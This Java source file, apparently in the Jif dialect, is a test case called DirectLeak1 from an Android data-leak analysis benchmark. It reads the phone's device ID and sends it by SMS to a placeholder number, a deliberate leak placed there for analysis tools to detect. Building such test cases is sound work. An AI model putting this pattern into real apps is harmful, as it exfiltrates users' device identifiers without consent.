package test;

import test.Activity;
import android.os.Bundle;
import test.SmsManager;
import android.telephony.TelephonyManager;
import test.R;
import jif.runtime.Runtime;

/**
 * @testcase_name DirectLeak1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description Easy testcase: The value of a source is directly sent to a sink
 * @dataflow source -> sink
 * @number_of_leaks 1
 * @challenges -
	* ADAPTACIONES: 
	*	se adiciona try-catch ClassCastException y NullPointerException
 */
public class MainActivity extends Activity {

    @Override
    protected void onCreate{}(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout);
        try {
            TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage("+49 1234", null, mgr.getDeviceId(), null, null);
        } catch (ClassCastException ignore) {
        } catch (NullPointerException e) {
        }
    }
}
